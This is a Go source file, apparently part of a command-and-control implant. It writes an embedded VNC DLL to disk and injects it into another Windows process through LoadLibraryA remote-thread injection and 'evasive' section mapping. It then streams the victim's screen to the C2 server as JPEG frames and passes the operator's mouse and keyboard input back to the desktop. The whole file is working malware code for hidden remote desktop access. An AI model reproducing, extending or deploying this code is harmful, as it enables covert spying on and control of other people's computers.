//go:build windows

package agent

// VNC DLL injection — loads vnc_dll_x64.dll into a target process via
// classic LoadLibraryA remote thread injection, then relays the named-pipe
// BGRA stream to the C2 TCP connection as standard VNC JPEG frames.
//
// Architecture:
//   Target process (e.g. explorer.exe)
//     └─ vnc_dll_x64.dll  ←───────── injected by this code
//          └─ named pipe server  ←── BGRA frames + input events
//   This agent process
//     └─ named pipe client ──────────→ relay → C2 TCP (JPEG frames)

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	"net"
	"os"
	"path/filepath"
	"sync"
	"time"
	"unsafe"

	_ "embed"

	"golang.org/x/sys/windows"
)

//go:embed assets/vnc_dll_x64.dll
var vncDLLBytes []byte

var (
	procLoadLibraryA    = kernel32.NewProc("LoadLibraryA")
	procVirtualAllocEx  = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMem = kernel32.NewProc("WriteProcessMemory")
)

// vncDLLSession is a VNC session backed by the injected DLL + named pipe.
type vncDLLSession struct {
	conn    net.Conn
	quality int
	stop    chan struct{}
	once    sync.Once
}

func (s *vncDLLSession) shutdown() {
	s.once.Do(func() {
		close(s.stop)
		s.conn.Close()
	})
}

// injectVNCDLL injects the embedded VNC DLL into targetPID, waits for the
// pipe connection, and returns a vncDLLSession that relays frames to conn.
// If targetPID == 0, the DLL is injected into the current process's session
// by spawning a host process first (not yet implemented, falls through to error).
func vncStartDLL(callbackConn net.Conn, quality, targetPID int) error {
	if quality < 1 || quality > 100 {
		quality = 60
	}

	// Generate a random 8-hex-char ID.
	var idBytes [4]byte
	if _, err := rand.Read(idBytes[:]); err != nil {
		return fmt.Errorf("rand: %w", err)
	}
	id := hex.EncodeToString(idBytes[:])

	tmpDir := os.TempDir()
	dllPath := filepath.Join(tmpDir, "egv-"+id+".dll")
	cfgPath := filepath.Join(tmpDir, "egv-"+id+".cfg")
	pipeName := `\\.\pipe\egvnc-` + id

	// Write DLL to disk.
	if err := os.WriteFile(dllPath, vncDLLBytes, 0600); err != nil {
		return fmt.Errorf("write dll: %w", err)
	}

	// Write cfg: "pipeName quality\n"
	cfgContent := fmt.Sprintf("%s %d\n", pipeName, quality)
	if err := os.WriteFile(cfgPath, []byte(cfgContent), 0600); err != nil {
		os.Remove(dllPath)
		return fmt.Errorf("write cfg: %w", err)
	}

	// Create named pipe server before injecting (DLL will try to connect).
	// Use a security descriptor that allows any user to connect.
	pipeSA := &windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle:      0,
		SecurityDescriptor: nil,
	}
	hPipeServer, err := windows.CreateNamedPipe(
		windows.StringToUTF16Ptr(pipeName),
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
		1,            // max instances
		4*1024*1024,  // out buffer
		4*1024*1024,  // in buffer
		30000,        // timeout ms
		pipeSA,
	)
	if err != nil {
		os.Remove(dllPath)
		os.Remove(cfgPath)
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}

	// Inject DLL into target process.
	if err := injectDLLIntoProcess(uint32(targetPID), dllPath); err != nil {
		windows.CloseHandle(hPipeServer)
		os.Remove(dllPath)
		os.Remove(cfgPath)
		return fmt.Errorf("inject dll: %w", err)
	}

	// Wait for DLL to connect (up to 30s), then start relay.
	sess := &vncDLLSession{
		conn:    callbackConn,
		quality: quality,
		stop:    make(chan struct{}),
	}

	vncMu.Lock()
	if vncCurrent != nil {
		vncCurrent.shutdown()
	}
	// vncCurrent stores the standard *vncSession type; for the DLL mode
	// we store nil and manage shutdown separately.
	vncCurrent = nil
	vncMu.Unlock()

	go func() {
		defer sess.shutdown()
		defer windows.CloseHandle(hPipeServer)
		defer os.Remove(dllPath) // try (DLL may have scheduled deletion)
		defer os.Remove(cfgPath)

		// ConnectNamedPipe blocks until DLL calls CreateFile on the server pipe.
		connErr := make(chan error, 1)
		go func() {
			err := windows.ConnectNamedPipe(hPipeServer, nil)
			if err != nil && err.(windows.Errno) != windows.ERROR_PIPE_CONNECTED {
				connErr <- err
				return
			}
			connErr <- nil
		}()

		select {
		case <-sess.stop:
			return
		case err := <-connErr:
			if err != nil {
				return
			}
		case <-time.After(30 * time.Second):
			return
		}

		// hPipeServer is now connected. Wrap it as an io.ReadWriter.
		pipeRW := &windowsPipeRW{h: hPipeServer}
		sess.runPipeRelay(pipeRW)
	}()

	return nil
}

// injectDLLIntoProcess writes dllPath into targetPID's memory and creates
// a remote thread starting at LoadLibraryA.
func injectDLLIntoProcess(pid uint32, dllPath string) error {
	hProc, err := windows.OpenProcess(
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION,
		false, pid,
	)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// Write null-terminated path to remote process via evasive section mapping.
	pathBytes := append([]byte(dllPath), 0)
	remoteBase, err := injectViaSection(hProc, pathBytes)
	if err != nil {
		return fmt.Errorf("injectViaSection (path): %w", err)
	}

	// Get LoadLibraryA address — same in all processes (same ASLR slide per boot).
	llAddr := procLoadLibraryA.Addr()
	if llAddr == 0 {
		return fmt.Errorf("LoadLibraryA not found")
	}

	// Create remote thread: LoadLibraryA(remoteDllPath).
	th, err := hgCreateThreadEx(hProc, llAddr, remoteBase)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	// Wait briefly for the DLL to initialize (up to 5 s), then close handle.
	windows.WaitForSingleObject(th, 5000)
	windows.CloseHandle(th)
	return nil
}

// windowsPipeRW wraps a Windows HANDLE as an io.ReadWriter.
type windowsPipeRW struct {
	h   windows.Handle
	mu  sync.Mutex
}

func (p *windowsPipeRW) Read(buf []byte) (int, error) {
	var n uint32
	err := windows.ReadFile(p.h, buf, &n, nil)
	if err != nil {
		return 0, err
	}
	return int(n), nil
}

func (p *windowsPipeRW) Write(buf []byte) (int, error) {
	p.mu.Lock()
	defer p.mu.Unlock()
	var n uint32
	err := windows.WriteFile(p.h, buf, &n, nil)
	if err != nil {
		return 0, err
	}
	return int(n), nil
}

// runPipeRelay relays frames between the DLL pipe and the C2 TCP connection.
// DLL sends RAWFRAME (0xF0) → agent encodes JPEG → sends standard FRAME (0x01) to C2.
// C2 sends input events → agent forwards them over the pipe to the DLL.
func (s *vncDLLSession) runPipeRelay(pipe io.ReadWriter) {
	defer s.shutdown()

	// Goroutine: receive input from C2 TCP and forward to DLL pipe.
	go func() {
		for {
			typ, payload, err := readVNCFrame(s.conn)
			if err != nil {
				s.shutdown()
				return
			}
			switch typ {
			case vncSTOP:
				s.shutdown()
				return
			case vncPING:
				// proxy PING to DLL; DLL sends PONG back to us which we forward to C2
				sendVNCFrameRW(pipe, vncPING, nil)
			case vncQUALITY:
				if len(payload) >= 1 {
					vncMu.Lock()
					s.quality = int(payload[0])
					vncMu.Unlock()
				}
				// Forward QUALITY to DLL too (it ignores it, but harmless)
				sendVNCFrameRW(pipe, vncQUALITY, payload)
			default:
				// Mouse/keyboard — forward to DLL.
				sendVNCFrameRW(pipe, typ, payload)
			}
		}
	}()

	// Main loop: read from DLL pipe, process, forward to C2.
	for {
		select {
		case <-s.stop:
			return
		default:
		}

		hdr := make([]byte, 5)
		if _, err := io.ReadFull(pipe, hdr); err != nil {
			return
		}
		typ := hdr[0]
		plen := binary.LittleEndian.Uint32(hdr[1:5])
		if plen > 32*1024*1024 { // sanity: 32 MB
			return
		}
		payload := make([]byte, plen)
		if plen > 0 {
			if _, err := io.ReadFull(pipe, payload); err != nil {
				return
			}
		}

		switch typ {
		case vncINFO:
			// Forward INFO directly to C2 (JSON {"w":N,"h":N}).
			if err := sendVNCFrame(s.conn, vncINFO, payload); err != nil {
				return
			}

		case vncRAWFRAME:
			// [4B w][4B h][BGRA pixels...] → encode JPEG → send FRAME
			if plen < 8 {
				continue
			}
			w := int(binary.LittleEndian.Uint32(payload[0:4]))
			h := int(binary.LittleEndian.Uint32(payload[4:8]))
			bgra := payload[8:]
			if len(bgra) < w*h*4 {
				continue
			}

			vncMu.Lock()
			q := s.quality
			vncMu.Unlock()

			jpegBytes, err := bgraToJPEG(bgra, w, h, q)
			if err != nil {
				continue
			}

			p := make([]byte, 4+len(jpegBytes))
			binary.LittleEndian.PutUint16(p[0:2], uint16(w))
			binary.LittleEndian.PutUint16(p[2:4], uint16(h))
			copy(p[4:], jpegBytes)
			if err := sendVNCFrame(s.conn, vncFRAME, p); err != nil {
				return
			}

		case vncPONG:
			if err := sendVNCFrame(s.conn, vncPONG, nil); err != nil {
				return
			}
		}
	}
}

// vncRAWFRAME protocol constant for DLL pipe.
const vncRAWFRAME byte = 0xF0

// sendVNCFrameRW writes a framed VNC message to any io.Writer.
func sendVNCFrameRW(w io.Writer, typ byte, payload []byte) error {
	hdr := make([]byte, 5)
	hdr[0] = typ
	binary.LittleEndian.PutUint32(hdr[1:5], uint32(len(payload)))
	if _, err := w.Write(hdr); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err := w.Write(payload)
		return err
	}
	return nil
}

// bgraToJPEG encodes raw BGRA pixels as a JPEG at the given quality.
// GDI DIBSection produces BGRA (B G R A byte order), so we swap R/B to get RGBA.
func bgraToJPEG(bgra []byte, w, h, quality int) ([]byte, error) {
	img := image.NewNRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			i := (y*w + x) * 4
			if i+3 >= len(bgra) {
				break
			}
			// BGRA → RGBA
			img.Pix[(y*w+x)*4+0] = bgra[i+2] // R
			img.Pix[(y*w+x)*4+1] = bgra[i+1] // G
			img.Pix[(y*w+x)*4+2] = bgra[i+0] // B
			img.Pix[(y*w+x)*4+3] = 0xFF       // A
		}
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
